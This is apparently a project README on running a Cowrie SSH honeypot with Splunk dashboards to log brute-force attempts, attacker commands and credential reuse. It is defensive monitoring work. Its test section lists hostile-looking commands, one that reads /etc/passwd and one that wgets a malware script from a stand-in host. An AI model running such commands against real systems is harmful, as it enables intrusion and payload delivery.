### SSH Honeypot with Splunk Integration

## Objective
The goal of this project was to simulate a **vulnerable SSH environment** in order to monitor and analyze unauthorized access attempts.  
By deploying a **Cowrie SSH honeypot**, I was able to capture attacker behavior, collect brute-force attempts, and study credential reuse patterns in real time using **Splunk dashboards**.

---

## Environment Setup

### 1. Platform
- Deployed on a Linux VM (Ubuntu/Debian)
- SSH configured to run on the default port **22** for realism

### 2. Honeypot Tool
- Installed **Cowrie**, a medium-interaction SSH honeypot designed to log brute-force attacks and attacker commands  
- Simulated an SSH service with fake file systems and command responses

### 3. Logging & Monitoring
- Cowrie captured session data, usernames, passwords, and attacker commands  
- Integrated logs with **Splunk** via HTTP Event Collector for centralized monitoring, searching, and visualization

---

## Data Flow Overview
1. Attacker connects to the honeypot via SSH or Telnet  
2. Cowrie logs all activity and fake command execution  
3. A Python script (`send_to_splunk.py`) tails Cowrie’s logs and forwards data to Splunk’s HTTP Event Collector  
4. Splunk indexes the events and displays real-time dashboards

---

## How to Test the Honeypot

### SSH Test
```bash
ssh root@<Honeypot_Public_IP> -p 2222
```

## Try Fake Commands
ls
cat /etc/passwd
wget http://example.com/malware.sh

### Telnet Test
telnet <Honeypot_Public_IP> 2223

### Check Logs Directly
cd ~/cowrie/var/log/cowrie/
tail -f cowrie.log
tail -f jsonlog.json

## Data Captured
1. Brute Force Attempts
  - Multiple IPs attempted to brute force the root account with common usernames and passwords
  - Example: root:hello123, admin:123456, user:qwerty
2. Attacker Commands
  - Logged shell commands attackers tried to execute after "successful" login
  - Common attempts included downloading malware scripts, enumerating files, or checking system info
3. Credential Reuse
  - Several password reuse attempts were detected, highlighting weak password practices

## Analysis in Splunk
1. Indexed logs from Cowrie using the sourcetype linux_secure
2. Built dashboards and visualizations to identify:
  - Top attacker IP addresses
  - Most attempted usernames/passwords
  - Time-series trends of brute force attempts
3. Example insight: Over 6,500 SSH login attempts recorded in just a few days, with a conversation of attacks from a small set of IP addresses

